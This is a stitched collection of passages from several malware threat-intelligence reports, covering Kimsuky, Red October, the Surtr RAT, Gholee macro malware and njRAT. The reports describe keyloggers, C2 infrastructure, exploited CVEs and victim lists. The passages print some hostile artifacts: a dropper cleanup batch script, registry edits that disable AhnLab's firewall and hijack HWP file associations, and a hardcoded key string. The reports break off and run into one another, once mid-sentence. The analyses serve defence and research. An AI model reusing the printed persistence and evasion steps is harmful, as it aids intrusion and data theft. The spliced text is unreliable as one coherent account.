activities are performed via the "mail.bg" web-interface with the use of the system Wininet API functions.From all the samples that we managed to obtain, we extracted the following email accounts used in this
campaign:

beautifl@mail.bg
ennemyman@mail.bg
fasionman@mail.bg
happylove@mail.bg
lovest000@mail.bg
monneyman@mail.bg
sportsman@mail.bg
veryhappy@mail.bg

Here are the two "master" email addresses to which the bots send e-mails on behalf of the above-
mentioned accounts.They report on status and transmit infected system information via attachments:

iop110112@hotmail.com
rsh1213@hotmail.com
</section>

<section>
<heading>Regular reporting</heading>

To report infection status, the malware reads from C:Program FilesCommon FilesSystemOle
DBoledvbs.inc which contains the systeminfo command output.If the file exists, it is deleted after reading.Then, it reads user-related info from the file sqlxmlx.inc in the same folder (we can see strings referencing
to "UserID" commentary in this part of the code).But this file was never created.As you recall, there is a
function that should have collected this data and should have saved it into this sqlxmlx.inc file.However,
on the first launch, the collected user information is saved into "xmlrwbin.inc".This effectively means that
the malware writer mistakenly coded the bot to save user information into the wrong file.There is a
chance for the mistaken code to still work -- user information could be copied into the send information
heap.But not in this case - at the time of writing, the gathered user information variable which should
point to the xmlrwbin.inc filename has not yet been initialized, causing the file write to fail.We see that
sqlxmlx.inc is not created to store user information.Next, the intercepted keystrokes are read from the file and sent to the master.Keystrokes are logged and
kept in an ordinary and consistent format in this file - both the names of windows in which keys were
typed and the actual sequence of keyboard entry.This data is found in the file C:Program FilesCommon
FilesSystemOle DBmsolui80.inc created by the external key logger module.All this data is merged in one file xmlrwbin.inc, which is then encrypted with RC4.The RC4 key is
generated as an MD5 hash of a randomly generated 117-bytes buffer.To be able to decipher the data, the
attacker should certainly know either the MD5 hash or the whole buffer content.This data is also sent, but
RSA encrypted.The malware constructs a 1120 bit public key, uses it to encrypt the 117-bytes buffer.The
malware then concatenates all the data to be sent as a 128-bytes block.The resulting data is saved in
C:Program FilesCommon FilesSystemOle DB to a file named according to the following format:

"<system time>_<account at Bulgarian email server>.txt", for example, "08191757_beautifl@mail.bg.txt".The file is then attached to an e-mail and sent to the master's e-mail account.Following transmission, it is
immediately deleted from the victim system.</section>

<section>
<heading>Getting the master's data</heading>

The malware also retrieves instructions from the mail server.It checks for mails in its Bulgarian e-mail
account with a particular subject tag.We have identified several "subject tags" in the network
communication: Down_0, Down_1, Happy_0, Happy_2 and ddd_3.When found and the e-mail
maintains an attachment, the malware downloads this attachment and saves it with filename
"msdaipp.cnt" in C:Program FilesCommon FilesSystemOle DB.The attacker can send additional
executables in this way.The executables are RC4 encrypted and then attached.The key for decryption is
hardcoded in the malicious samples.It's interesting that the same "rsh!@!#" string is maintained across
all known samples and is used to generate RC4 keys.As described earlier, the malware computes the MD5
of this string and uses the hash as its RC4 key to decrypt the executable.Then, the plain executable is
dropped onto disk as "sqlsoldb.exe" and run, and then moved to the C:Windows folder with the file name
"taskmgr.exe".The original e-mail and its attachment are then deleted from the Bulgarian e-mail inbox.</section>

<section>
<heading>Key logger</heading>

The additional key logger module is not very complex -- it simply intercepts keystrokes and writes typed
keys into C:Program FilesCommon FilesSystemOle DBmsolui80.inc, and also records the active window
name where the user pressed keys.We saw this same format in the Madi malware.There is also one key
logger variant that logs keystrokes into C:WINDOWSsetup.log.</section>

<section>
<heading>Directory listing collector</heading>

The next program sent to victims enumerates all the drives on the infected system and executes the
following command on them:

dir <drive letter>: /a /s /t /-c

In practice, this command is written to C:WINDOWSmsdatt.bat and executed with output redirected to
C:WINDOWSmsdatl3.inc.As a result, the latter maintains a listing of all files in all the folders on the
drive.The malware later reads that data and appends it to content of the file C:Program FilesCommon
FilesSystemOle DBoledvbs.inc.At this point, "oledvbs.inc "already stores systeminfo output.It's interesting that one sample of the directory listing collector was infected with the infamous "Viking"
virus of Chinese origin.Some of this virus' modifications were wandering in the wild for years and its
authors or operators would never expect to see it end up in a clandestine APT-related spying tool.For the
attackers, this is certainly a big failure.Not only does the original spying program have marks of well-
known malware that can be detected by anti-malware products; moreover the attackers are revealing their
secret activities to cyber-criminal gangs.However, by all appearances, the attackers noticed the unwanted
addition to their malware and got rid of the infection.This was the only sample bearing the Viking virus.Due to expensive work of malware with variety of additional files, it's not out of place to show these
"relationships" in a diagram:

<figure></figure>

</section>

<section>
<heading>HWP document stealer</heading>

This module intercepts HWP documents on an infected computer.The HWP file format is similar to
Microsoft Word documents, but supported by Hangul, a South Korean word processing application from
the Hancom Office bundle.Hancom Office is widely used in South Korea.This malware module works
independently of the others and maintains its own Bulgarian e-mail account.The account is hardcoded in
the module along with the master's e-mail to which it sends intercepted documents.It is interesting that
the module does not search for all the HWP files on infected computer, but reacts only to those that are
opened by the user and steals them.This behavior is very unusual for a document-stealing component and
we do not see it in other malicious toolkits.The program copies itself as <Hangul full path>HncReporter.exe and changes the default program
association in the registry to open HWP documents.To do so, it alters following registry values:

HKEY_CLASSES_ROOTHwp.Document.7shellopencommand
or
HKEY_CLASSES_ROOTHwp.Document.8shellopencommand

By default, there is the registry setting "<Hangul full path>Hwp.exe" "%1" associating Hangul application
"Hwp.exe" with .HWP documents.But the malicious program replaces this string with the following: "
<Hangul full path>HncReporter.exe " "%1".So, when the user is opening any .HWP document, the
malware program itself is executed to open the .HWP document.Following this registry edit, any opened
.HWP document is read and sent as an e-mail attachment with the subject "Hwp" to the attackers.After
sending, the malware executes the real Hangul word processing application "Hwp.exe" to open the .HWP
document as the user intended.The means the victim most likely will not notice the theft of the .HWP file.The module's sending routine depends on the following files in C:Program FilesCommon FilesSystemOle
DB folder: xmlrwbin.inc, msdaipp.cnt, msdapml.cnt, msdaerr.cnt, msdmeng.cnt and oledjvs.inc.</section>

<section>
<heading>Remote control module downloader</heading>

An extra program is dedicated exclusively to download attachments out of incoming e-mails with a
particular subject tag.This program is similar to the pivot module but with reduced functionality: it
maintains the hardcoded Bulgarian e-mail account, logs in, reads incoming e-mails and searches for the
special subject tag "Team".When found, it loads the related attachment, drops it onto the hard drive as
C:Program FilesCommon FilesSystemOle DBtaskmgr.exe and executes.This particular executable arrives
without any encryption.</section>

<section>
<heading>Remote control module</heading>

It is also interesting that the malware author did not custom develop a backdoor program.Instead, the
author modified TeamViewer client version 5.0.9104.The initial executable pushed by attackers in e-mails
related to the remote control module consists of three more executables.Two of them are Team Viewer
components themselves, and another is some sort of backdoor loader.So, the dropper creates three files in
the C:WindowsSystem32 directory:

netsvcs.exe - the modified Team Viewer client;
netsvcs_ko.dll - resources library of Team Viewer client;
vcmon.exe - installer/starter;

and creates the service "Remote Access Service", adjusted to execute C:WindowsSystem32vcmon.exe at

system startup.Every time the vcmon.exe is executed, it disables AhnLab's firewall by zeroing out
following registry values:

HKLMSOFTWAREAhnLabV3 365 ClinicInternetSec
     UseFw = 0
     UseIps = 0

Then, it modifies the Team Viewer registry settings.As we said, the Team Viewer components used in this
campaign are not the original ones.They are slightly modified.In total, we found two different variants of
changed versions.The malware author replaced all the entries of "Teamviewer" strings in Team Viewer
components.In the first case with the "Goldstager" string and with the string "Coinstager" in the second.TeamViewer client registry settings are then HKLMSoftwareGoldstagerVersion5 and
HKLMSoftwareCoinstagerVersion5 correspondingly.The launcher sets up several registry values that
control how the remote access tool will work.Among them is SecurityPasswordAES.This parameter
represents a hash of the password with which a remote user has to connect to Team Viewer client.This
way, the attackers set a pre-shared authentication value.After that, the starter executes the very Team
Viewer client netsvcs.exe.</section>

<section>
<heading>Who's Kim?</heading>

It's interesting that the drop box mail accounts iop110112@hotmail.com and rsh1213@hotmail.com are
registered with the following "kim" names: kimsukyang and "Kim asdfa".Of course, we can't be certain that these are the real names of the attackers.However, the selection isn't
frequently seen.Perhaps it also points to the suspected North Korean origin of attack.Taking into account
the profiles of the targeted organizations -- South Korean universities that conduct researches on
international affairs, produce defense policies for government, national shipping company, supporting
groups for Korean unification -- one might easily suspect that the attackers might be from North Korea.The targets almost perfectly fall into their sphere of interest.On the other hand, it is not that hard to enter
arbitrary registration information and misdirect investigators to an obvious North Korean origin.It does
not cost anything to concoct fake registration data and enter kimsukyang during a Hotmail registration.We concede that this registration data does not provide concrete, indisputable information about the
attackers.However, the attackers' IP-addresses do provide some additional clues.During our analysis, we observed
ten IP-addresses used by the Kimsuky operators.All of them lie in ranges of the Jilin Province Network
and Liaoning Province Network, in China.<figure></figure>

No other IP-addresses have been uncovered that would point to the attackers' activity and belong to other
IP-ranges.Interestingly, the ISPs providing internet access in these provinces are also believed to
maintain lines into North Korea.Finally, this geo-location supports the likely theory that the attackers
behind Kimsuky are based in North Korea.</section>

</doc>A large
scale cyber-espionage network was revealed and analyzed during the investigation, which we called "Red
October" (after famous novel "The Hunt For The Red October").This report is based on detailed technical analysis of a series of targeted attacks against diplomatic,
governmental and scientific research organizations in different countries, mostly related to the region of
Eastern Europe, former USSR members and countries in Central Asia.The main objective of the attackers was to gather intelligence from the compromised organizations, which
included computer systems, personal mobile devices and network equipment.The earliest evidence indicates that the cyber-espionage campaign was active since 2007 and is still active
at the time of writing (January 2013).Besides that, registration data used for the purchase of several
Command & Control (C&C) servers and unique malware filenames related to the current attackers hints at
even earlier time of activity dating back to May 2007.</section>
<section>

<heading>Main Findings</heading>

Advanced Cyber-espionage Network: The attackers have been active for at least several years,
focusing on diplomatic and governmental agencies of various countries across the world.Information harvested from infected networks was reused in later attacks.For example, stolen credentials
were compiled in a list and used when the attackers needed to guess secret phrase in other locations.To
control the network of infected machines, the attackers created more than 60 domain names and several
server hosting locations in different countries (mainly Germany and Russia).The C&C infrastructure is
actually a chain of servers working as proxies and hiding the location of the 'mothership' control server.Unique architecture: The attackers created a multi-functional kit which has a capability of quick
extension of the features that gather intelligence.The system is resistant to C&C server takeover and
allows the attack to recover access to infected machines using alternative communication channels.Broad variety of targets: Beside traditional attack targets (workstations), the system is capable of
stealing data from mobile devices, such as smartphones (iPhone, Nokia, Windows Mobile), enterprise
network equipment (Cisco), removable disk drives (including already deleted files via a custom file
recovery procedure).Importation of exploits: The samples we managed to find were using exploit code for vulnerabilities in
Microsoft Word and Microsoft Excel that were created by other attackers and employed during different
cyber attacks.The attackers left the imported exploit code untouched, perhaps to harden the identification
process.Attacker identification: Basing on registration data of C&C servers and numerous artifacts left in
executables of the malware, we strongly believe that the attackers have Russian-speaking origins.Current
attackers and executables developed by them have been unknown until recently, they have never related to
any other targeted cyberattacks.</section>
<section>
<heading>
Anatomy of the attack
</heading>
General description

These attacks comprised of the classical scenario of specific targeted attacks, consisting of two major
stages:

   1.Initial infection
   2.Additional modules deployed for intelligence gathering

The malicious code was delivered via e-mail as attachments (Microsoft Excel, Word and, probably PDF
documents) which were rigged with exploit code for known security vulnerabilities in the mentioned
applications.In addition to Office documents (CVE-2009-3129, CVE-2010-3333, CVE-2012-0158), it
appears that the attackers also infiltrated victim network(s) via Java exploitation (known as the 'Rhino'
exploit (CVE-2011-3544).Right after the victim opened the malicious document or visit malicious URL on a vulnerable system, the
embedded malicious code initiated the setup of the main component which in turn handled further
communication with the C&C servers.Next, the system receives a number of additional spy modules from the C&C server, including modules to
handle infection of smartphones.The main purpose of the spying modules is to steal information.This includes files from different
cryptographic systems, such as "Acid Cryptofiler", (see https://fr.wikipedia.org/wiki/Acid_Cryptofiler)
which is known to be used in organizations of European Union/European Parliament/European
Commission since the summer of 2011.All gathered information is packed, encrypted and only then
transferred to the C&C server.</section>
<section>
Step-by-step description (1st stage)

During our investigation we couldn't find any e-mails used in the attacks, only top level dropper
documents.Nevertheless, based on indirect evidence, we know that the e-mails can be sent using one of
the following methods:

      Using an anonymous mailbox from a free public email service provider
      Using mailboxes from already infected organizations

E-mail subject lines as well as the text in e-mail bodies varied depending on the target (recipient).The
attached file contained the exploit code which activated a Trojan dropper in the system.We have observed the use of at least three different exploits for previously known vulnerabilities: CVE-
2009-3129 (MS Excel), CVE-2010-3333 (MS Word) and CVE-2012-0158 (MS Word).The first attacks that
used the exploit for MS Excel started in 2010, while attacks targeting the MS Word vulnerabilities
appeared in the summer of 2012.As a notable fact, the attackers used exploit code that was made public and originally came from a
previously known targeted attack campaign with Chinese origins.The only thing that was changed is the
executable which was embedded in the document; the attackers replaced it with their own code.The embedded executable is a file-dropper, which extracts and runs three additional files.%TEMP%MSC.BAT

%ProgramFiles%WINDOWS NTLHAFD.GCP (<- This file name varies)

%ProgramFiles%WINDOWS NTSVCHOST.EXE
MSC.BAT file has the following contents:

chcp 1251

:Repeat

attrib -a -s -h -r "%DROPPER_FILE%"

del "%DROPPER_FILE%"

if exist "%DROPPER_FILE%" goto Repeat

del "%TEMP%msc.bat"


Another noteworthy fact is in the first line of this file, which is a command to switch the codepage of an
infected system to 1251.This is required to address files and directories that contain Cyrillic characters in
their names.<figure></figure>

The "LHAFD.GCP" file is encrypted with RC4 and compressed with the "Zlib" library.This file is
essentially a backdoor, which is decoded by the loader module (svchost.exe).The decrypted file is injected
into system memory and is responsible for communication with the C&C server.<figure></figure>


On any infected system, every major task is performed by the main backdoor component.The main
component is started only after its loader ("svchost.exe") checks if the internet connection is available.<figure></figure>

<caption>
Encrypted communication with the C2
</caption>

During our investigation, we found more than 60 different command-and-control domains.Each malware
sample contains three such domains, which are hardcoded inside the main backdoor component:
<figure></figure>
<caption>
Hardcoded C2 domains inside backdoor</caption>

</section>
<section>
Step-by-step description (2nd stage)

After a connection with the C&C server is established, the backdoor starts the communication process,
which leads to the loading of additional modules.These modules can be split into two categories: "offline"
and "online".The main difference between these categories is their behavior on the infected system:

      "Offline": exists as files on local disk, capable of creating its own system registry keys, local disk log
      files, and may communicate with C&C servers on their own."Online": exists only in system memory and is never saved to local disk, do not create registry keys,
      all logs are also kept in memory instead of local disk and sends the result of work to the C&C server
      using own code.<figure></figure>
There is a notable module among all others, which is essentially created to be embedded into Adobe
Reader and Microsoft Office applications.The main purpose of its code is to create a foolproof way to
regain access to the target system.The module expects a specially crafted document with attached
executable code and special tags.The document may be sent to the victim via e-mail.It will not have an
exploit code and will safely pass all security checks.However, like with exploit case, the document will be
instantly processed by the module and the module will start a malicious application attached to the
document.This trick can be used to regain access to the infected machines in case of unexpected C&C servers
shutdown/takeover.</section>
<section>
<heading>
Timeline</heading>

We have identified over 1000 different malicious files related to over 30 modules of this Trojan kit.Most
of them were created between May 2010 and October 2012.There were 115 file-creation dates identified which are related to these campaigns via emails during the
last two and a half years.First, we used the Kaspersky Security
Network (KSN) and then we set up our own sinkhole server.The data received using two independent
ways was correlating and this confirmed objective findings.</section>
<section>
<heading>
KSN statistics</heading>

The attackers used already detected exploit codes and because of this, in the beginning of the research we
already had some statistics of detections with our anti-malware software.We searched for similar
detections for the period of 2011-2012.That is how we discovered more than 300 unique systems, which had detected at least one module of this
Trojan kit.Apparently, real number and list of victim
names is much larger than mentioned above.</section>
<section>
<heading>
Sinkhole statistics
</heading>
During our analysis, we uncovered more than 60 different domains used by different variants of the
malware.Out of the list of domains, several were expired so we registered them to evaluate the number of victims
connecting to them.During the monitoring period (2- Nov 2012 - 10 Jan 2013), we registered over 55,000 connections to the
sinkhole.The most popular domain is "dll-host-update.com", which is receiving most of the traffic.<figure></figure>
From the point of view of country distribution of connections to the sinkhole, we have observed victims in
39 countries, with most of IPs being from Switzerland.Kazakhstan and Greece follow next.<figure></figure>
Interestingly, when connecting to the sinkhole, the backdoors submit their unique victim ID, which allows
us to separate the multiple IPs per victims.<figure></figure>



Based on the traffic received to our sinkhole, we created the following list of unique victim IDs, countries
and possible profiles:
<table>
            Victim ID                      Country                    Victim profile
            0706010C1BC0B9E5B702           Kazakhstan                 Gov research institute
            0F746C2F283E2FACE581           Kazakhstan                 ?150BD7E7449C42C66ED1           Kazakhstan                 ?15B7400DBC4975BFAEF6           Austria                    ?24157B5D2CD0CA8AA602            UAE                        ?3619E36303A2A56DC880            Russia                     Foreign Embassy
            4624C55DEF872FBF2A93            Spain                      ?4B5181583F843A904568            Spain                      ?4BB2783B8AEC0B439CE8            Switzerland                ?5392032B24AAEE8F3333            Kazakhstan                 ?569530675E86118895C4            Pakistan                   ?57FE04BA107DD56D2820            Iran                       Foreign Embassy
            5D4102CD1D87417FF93B            Russia                     Gov research institute
            5E65486EF8CC4EE4DB5B            Japan                      Foreign Trade Commission
            6127D685ED1E72E09201            Kazakhstan                 ?6B9AFF89A02958C79C17            Ireland                    Foreign Embassy
            6D97B24C08DD64EEDE03            Czech Republic             ?7B14DE85C80368337E87            Turkey                     ?89BF96469244534DC092            Belarus                    Gov research institute
            8AA071A22BEDD8D8EC13            Moldova                    Government
            8C58407030570D3A3F52            Albania                    ?947827A169348FB01E2F            Bosnia and Herzegovina     ?B34C94D561B348EAC75D            Switzerland                ?B49FC93701E7B7F83C44            Belgium                    ?B6E4946A47FC3963ABC1            Kazakhstan                 Energy research group
            C978C25326D96C995038            Russia                     ?D48A783D288DC72A702B            Kazakhstan                 Aerospace
            DAE795D285E0A01ADED5            Russia                     Trading company
            DD767EEEF83A62388241            Russia                     Gov research institute
</table>
In some cases, it is possible to create a profile of the victim based on the IP address; in most of the cases,
however, the identity of the victim remains unknown.</section>
<section>
<heading>
KSN + sinkhole data
</heading>
Some of the victim organizations were identified using IP addresses and public WHOIS information or
remote system names.The domain has since been registered by Kaspersky Lab on Nov
2nd, 2012 to monitor the attacker's activities.Another interesting example is "dll-host-udate.com" - the "udate" part appears to be a typo.All the domains used by attackers appear to have been registered between 2007-2012.The oldest known
domain was registered in Nov 2007; the newest on May 2012.Most of the domains have been registered using the service "reg.ru", but other services such as
"webdrive.ru", "webnames.ru" or "timeweb.ru" have been used as well.During our monitoring, we observed the domains pointing to several malicious webservers.A list of
servers with confirmed malicious behavior can be found below.In total, we have identified 10 different servers which exhibited confirmed malicious behavior.Most of
these severs are located in Germany, at Hetzner Online Ag.<figure></figure>
During our analysis, we were able to obtain an image of one of the command-and-control servers.The
server itself proved to be a proxy, which was forwarding the request to another server on port 40080.The
script responsible for redirections was found in /root/scp.pl and relies on the "socat" tool for stream
redirection.This is important and probably indicates that the three known mini-motherships are
probably just proxies themselves, pointing to the same top level "mothership" server.The "/cgi-bin/nt/sk"
script is called by the running plugins to upload stolen data and information about the victim.When connecting to the C&C, the backdoor identifies itself with a specific string which includes a
hexadecimal value that appears to be the victim's unique ID.Different variants of the backdoor contain
different victim IDs.Presumably, this allows the attackers to distinguish between the multitudes of
connections and perform specific operations for each victim individually.For instance, a top level XLS dropper presumably used against a Polish target, named "Katyn_-
_opinia_Rosjan.xls" contains the hardcoded victim ID "F50D0B17F870EB38026F".A similar XLS named
"tactlist_05-05-2011_.8634.xls / EEAS New contact list (05-05-2011).xls" possibly used in Moldova
contains a victim ID "FCF5E48A0AE558F4B859".Part 2 of this paper will cover malware modules and provide more technical details about
their operation.</section>
</doc>The email in question purported to be from a prominent
member of the Tibetan community and repurposed content from a community mailing list.Attached to the email were what

appeared to be three Microsoft Word documents (.doc), but which were trojaned with a malware family we call “Surtr”.<fn>1</fn> All three
attachments drop the exact same malware.We have seen the Surtr malware family used in attacks on Tibetan groups dating back
to November 2012.</section>
<section>

<heading>Delivery Mechanism</heading>
While the malicious attachments appear to be DOC files due to their file extension, they are actually RTFs crafted to exploit a
vulnerability in Microsoft Word: CVE-2012-0158.This particular vulnerability was first exploited in early April 2012 and a patch was released by Microsoft on April 10, 2012.Currently, the sample is detected as malicious by 34 percent of antivirus (AV) engines on VirusTotal (VT).The malicious attachment is created using a shared template that we have seen used against multiple Tibetan groups.This
template was created in March 2013 and, instead of specifically using the vulnerable ActiveX controls described in the
vulnerability description, it utilizes the Chartspace Office Web Component.This component either suffers from the same
vulnerability or uses one of the named ActiveX controls resulting in the attacker being able to execute malicious code.Figure 1: Hexdump of the malicious attachment
                                           <figure></figure>
Although CVE-2012-0158 was first published and used in the wild in April 2012, samples using this template were only initially
detected by three AV engines (on VT).Therefore, while a third of AV engines had a detection signature for CVE-2012-0158 as
late as April 2013, it was possible to design a document using a year old vulnerability that was recognized as malicious by very
few AV products.This number has since risen and it is currently being detected by 34 percent of the AV products listed on VT.This vulnerability highlights the need to keep both operating systems and applications up to date as well as to exercise vigilance
concerning links and email attachments.Malicious attachments with this template all use a similar dropper which originally drops the payload to the temporary file
directory.</section>

<section>

<heading>Payload</heading>
Surtr creates either a new explorer or iexplore process and injects itself into this new process using CreateRemoteThread
function.It also creates the following folders:

%ALL USERS%/Application Data/Microsoft/Windows/123
%ALL USERS%/Application Data/Microsoft/Windows/Burn
%ALL USERS%/Application Data/Microsoft/Windows/LiveUpdata_Mem

It creates multiple copies of the payload including in both the Burn and LiveUpdata_Mem folders.The copy in the Burn folder is
called [VICTIM COMPUTER NAME].dll and there are three copies in the LiveUpdata_Mem folder whose names consist of 6
random alphanumeric characters which are then appended with .dll, _Fra.dll and _One.dll.These copies will differ from the
original payload dropped in the %TEMP% folder by filling the resource section with varying amounts of 00 bytes.This also results
in the malware having a much larger file size (30-50mb) possibly in an attempt to evade antivirus heuristics.Surtr connects to a command and control server (C2) and downloads a stage two component to %ALL USERS%/Application
Data/Microsoft/Windows/Burn/_[VICTIM COMPUTER NAME].log.This particular sample connects to internet.3-a.net on port 9696.In May 2012, internet.3-a.net resolved to the same IP (184.82.123.143) as android.uyghur.dnsd.me, which is a C2 used in
Android malware attacks that targeted the Tibetan community as previously documented by the Citizen Lab.The stage two component that was downloaded in this particular case has an internal name of x86_GmRemote.dll, however we
have seen an alternate stage two used with the name Remote.dll as well.Our analysis in this post focuses on the GmRemote
variation as it has been seen in multiple attacks.Surtr’s capabilities include listing of file directories and contents on the victim computer and any USB drives connected to a victim
machine, viewing web cache, executing remote commands and logging keystrokes.The keylogger output is disguised by adding a constant to the
ordinal value of the character.This data can then be sent to the C2.It is compressed using zlib DEFLATE so the network traffic is not human readable without
decompression.It can also download additional malware onto the victim computer, which can provide attackers with further abilities like accessing
the victim computer’s webcam or microphone.In particular, we have seen Surtr used in conjunction with the Gh0st RAT derived
LURK0 malware.For persistency, Surtr adds a key to the registry to ensure it runs when the infected computer is restarted.It also stores its C2
information and a campaign code in the registry.Depending on the configuration, Surtr will either create multiple registry keys in Software\Microsoft\Windows Media in HKU (hkey
users) with text data or a single key called XC consisting of binary data.These are usually xor encrypted with a key of 0×1.These C2s were also used in
previous attacks documented in an earlier Citizen Lab post on LURK0 malware targeting the Tibetan community.One particular sample (md5: ad9e5f79585eb62bc40b737e98bfd62e) which connects to C2 domain dtl6.mooo.com (which
resolved to the same IP as the other dtl domains mentioned above) on port 6178 was seen to download LURK0 malware after the
initial Surtr infection.This LURK0 sample had the campaign code ZQ6 that connects to C2 domain tbwm.wlyf.org on port 3103.This domain also resolved to the same IP as the dtl domains.We have also found reports of other Surtr stage 2 (GmRemote) samples that have campaign codes which suggest they may be
targeted at commercial and government targets.The first sample was found via ThreatExpert.It uses campaign code kmlg-0308, and connects to a C2 at flyoutside.com.However, we do not have information about where
these samples were submitted from, so the target sector and victims cannot be confirmed.A second GmRemote sample was found via the web, called Trojan/Subxe.89E1 by Anchiva.This sample connects to
google.djkcc.com and uses campaign code in1102.Other subdomains under djkcc.com include:

airforce.djkcc.com
domain.djkcc.com
google.djkcc.com
indianembassy.djkcc.com
mailnic.djkcc.com (MailNIC is an Indian email site at the National Informatics Centre)
microsoft.djkcc.com
rediffmail.djkcc.com (Rediffmail is an Indian email site)

While we do not have information about what victims these samples target, the campaign code, C2 domain, and related
subdomains give some possible indications.One additional find via VTI is a GmRemote sample internally named: GmKeyBoradServer_DLL.dll (MD5
e7e1c69496ad7cf093945d3380a2c6f4).It exports functions (GmFunctionType, GmInitPoint, GmMyInitPoint, GmRecvPoint, GmShutPoint, GmVerSion) that are referenced
in other GmRemote samples, although none of them have any real content.These additional samples suggest that Surtr is being used to target groups beyond the Tibetan community and is possibly being
utilized by multiple threat actors.</section>
<section>


<heading>Conclusions and Recommendations</heading>
The attacks we have observed that use the Surtr malware family are another example of the persistent targeted malware
campaigns the Tibetan community faces.The specific attack reported in this post demonstrates that attackers are actively monitor
mailing lists and discussion groups used by the Tibetan community and repurpose the content for use in targeted malware
attacks.For communities under persistent threat from targeted malware campaigns, user vigilance and education are essential for
reducing risk.Users should carefully examine the sender’s email address of emails and exercise caution in opening unexpected or
        unsolicited attachments or opening unverified links.See Citizen Lab’s Recommendations for defending against targeted cyber threats for additional information, and Tibet
        Action Institute’s Detach from Attachments and Think Before You Click campaigns.The Citizen Lab is continuing to monitor targeted malware campaigns using Surtr and will post updates as they are available.Notable Strings:

cScCssvdcfhgshtj
CrtRunTime.log
aCvVpR
_One.dll
_Fra.dll
asasdasrqwfsdvctyqwm
efskdfjaslkfjlaksd
dksfjasdklfjasd
casfjaklsdjfaskdlf
bakjfasdkljfkldfjaslkd
adskjfksldjfklsad
soul
LiveUpdata_Mem\
Burn\

Stage 2 (downloaded component)

MD5: 21aa9dd44738d5bf9d8a8ecf53c3108c

Notable Strings:
x86_GmRemote.dll
Mark
D:\Project\GTProject\Public\List\ListManager.cpp
</section>
<section>



Footnote
<footnote>
1
    Surtr is a fire giant in Norse Mythology.We chose Surtr as this malware family’s namesake because the malware creates a
folder named ‘Burn’
</footnote>
</section>
<section>


Post a Comment

Your email is never shared.Required fields are marked *

Name *



Email *



Website



Comment




 Post Comment

                                                   © Citizenlab 2013 | Contact | RSS

</section>
</doc><doc>

                                                    <noncontent>http://www.clearskysec.com/gholee-a-protective-...</noncontent>




         <header>Introduction</header>
<section>
         During the 2014 Israel–Gaza con�ict, dubbed by Israel as
         “operation protective edge”, a raise in cyber-attacks against Israeli
         targets was reported.In this report we analyze one case of an
         operation protective edge themed spear phishing attack.That
         email contained a malicious excel �le, which once opened and its
         VBA code executed, would infect the victim’s computer.As for the publication of this report, the �le is recognized as
         malicious by only one antivirus engine.Based on our analysis, we believe the threat actor behind this
         malware is a high level professional.</section>
<section>
         <heading>Gholee</heading>
         Our investigation of the Gholee malware started following a
         detection of a suspicious �le that was sent in an email to an
         undisclosed recipient.The �le name was ‘Operation Protective
         Edge.xlsb’ (MD5: d0c3f4c9896d41a7c42737134ffb4c2e).The �le was uploaded to Virus Total the �rst time on 10 August
         2014, from Israel.At that time it was not detected as malicious by
         any of the 52 tested antivirus engines.Nine days later, it was

<noncontent>1 of 8                                                                          03/22/2015 07:49 PM
                                                   http://www.clearskysec.com/gholee-a-protective-...</noncontent>



         uploaded again to Virus total, again from Israel.This time it was
         detected as malicious only by Kaspersky, as Trojan-
         Dropper.MSExcel.Agent.ce.</section>
<section>
         <heading>Infection</heading>
         Upon opening the �le a message is displayed, saying:


         “Due to security considerations I consciously hid the
         Informations.It will be visible for you by enabling content above.”


<figure></figure>

                                            [1]


         This is a social engineering tactic meant to lure the victim into
         enabling Macro content.The ASCII
         codes are converted to strings as they are concatenated into a
         single variable within a function


         Tens of these functions then concatenated, creating a single PE
         �le

         [2]


<figure></figure>

                                         [3]


         Finally, the �le is saved to NTUSER.data.{GUIDE}.dll (MD5:
         48573a150562c57742230583456b4c02) and the function
         ShellExecte is used to run it under cmd.exe /C and Rundll32 This
         is in order to hide the process.The Dll �le is obfuscated and includes various mechanism to hide
         from Debuggers such as Ollydbg and IDA and from Sandbox
         software such as Cuckoo and Anubis.Analyzing the �le, we have found an interesting entry point called
         gholee.<noncontent>4 of 8                                                                      03/22/2015 07:49 PM
                                                  http://www.clearskysec.com/gholee-a-protective-...</noncontent>


<figure></figure>

                                            [7]


         The malware opens an SSL connection over port 443 using a
         digital certi�cate that expired in 2010.The certi�cate was issued
         for security company Core Security, the creators of the offensive
         suite Core Impact, for the address *coreimpactagent.net.[8]


<figure></figure>

                                          [9]


         It was issued by Thawte certi�cate authority.The �le
         name is “svchost 67.exe” (MD5:
         916be1b609ed3dc80e5039a1d8102e82 ) and it was uploaded to
         Virus Total[5] on 2 June 2014, more than two months earlier than
         “Operation Protective Edge.xlsb”.It was uploaded twice from
         Latvia – potentially to test the malware’s detection rate.“svchost 67.exe” communicated with 83.170.33.37, which is on the
         same /26 netblock as the address “Operation Protective Edge.xlsb”


<noncontent>6 of 8                                                                       03/22/2015 07:49 PM
                                                  http://www.clearskysec.com/gholee-a-protective-...</noncontent>



         is commutating with.</section>

<section>
         <heading>Detection and prevention</heading>
            By using GPO to disable macro code from running, infection by
            this malware may be avoided.Alternatively, �les containing
            macro code should be blocked at the email gateway or by an
            anti-spam solution.Logs and proxy servers should be checked for communication
            with the IP addresses with which the malware communicates:


         83.170.33.60


         83.170.33.37

            If you think you got infected, check in the system root folder
            for a �le called NTUSER.DAT.{$GUID}.dll .This remote access trojan (RAT) has capabilities to log keystrokes, access the victim's
camera, steal credentials stored in browsers, open a reverse shell, upload/download files, view
the victim's desktop, perform process, file, and registry manipulations, and capabilities to let the
attacker update, uninstall, restart, close, disconnect the RAT and rename its campaign ID.Through the Command & Control (CnC) server software, the attacker has capabilities to create
and configure the malware to spread through USB drives."njRAT" is currently leveraged by advanced threat actors in the Middle East, in particular when
delivered via HTTP (i.e.Phishing attack or Drive-by download).It has also been observed that
attackers are delivering "njRAT" embedded in other applications (i.e.L517 v.0.994 Word List
Generator), and compressed with EZIRIZ .NET Reactor/.NET protector.Obfuscation with the use
of compressors or protectors is a technique used by attackers to prevent detection by network-
based and host-based security defenses.We have observed the majority of the attacks leveraging "njRAT" to be against organizations
based in or focused on the Middle East region in the government, telecom, and energy sectors.However as this is a publicly available tool it can be attained and deployed with ease regardless
of location or industry.During the analysis of "njRAT", it was observed that some of the top antivirus vendors were not
currently detecting some variants of this threat.Some of the file names of carrier files or njRAT samples observed were: L517 v0.994.exe,
RealUpgrade.exe, password hotmail cracker 2013.exe, elisa.exe, Crack All Games.exe, fresh cc



Users are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use.This document cannot be modified or converted to any other electronic or machine-readable form in whole or in part without prior
